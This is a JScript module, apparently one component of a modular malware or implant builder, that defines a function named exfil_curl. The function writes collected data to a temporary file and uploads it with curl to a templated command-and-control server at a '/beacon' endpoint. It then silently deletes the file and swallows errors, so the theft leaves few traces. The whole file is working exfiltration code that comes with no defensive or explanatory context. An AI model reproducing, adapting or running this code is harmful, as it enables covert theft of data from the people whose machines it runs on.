// chunk: exfil/curl_lolbin
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: exfil_curl
// format: jscript

function exfil_curl() {
    var tmp = _s.ExpandEnvironmentStrings("%TEMP%") + "\\~exfil.dat";
    try {
        var f = _fso.CreateTextFile(tmp, true);
        f.Write(_buf);
        f.Close();
        _run("curl -s -X POST -d @\"" + tmp + "\" http://{{C2_IP}}:{{C2_PORT}}/beacon 2>NUL");
        _fso.DeleteFile(tmp);
    } catch(ex) {}
}
